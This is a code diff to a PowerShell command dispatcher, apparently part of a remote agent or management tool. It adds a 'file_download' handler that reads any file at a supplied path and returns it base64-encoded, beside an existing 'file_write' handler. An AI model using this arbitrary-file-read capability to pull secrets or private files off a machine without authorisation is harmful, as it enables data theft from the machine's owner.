@@ -70,6 +70,16 @@ function Run($c, $a) {
                 @{success=$false; error="$_"}
             }
         }
+        "file_download" {
+            # Binary file download - reads any file type as bytes
+            try {
+                $bytes = [IO.File]::ReadAllBytes($a.path)
+                $b64 = [Convert]::ToBase64String($bytes)
+                @{success=$true; b64=$b64; size=$bytes.Length; path=$a.path}
+            } catch {
+                @{success=$false; error="$_"}
+            }
+        }
         "file_write" {
             try {
                 [IO.File]::WriteAllText($a.path, $a.content)
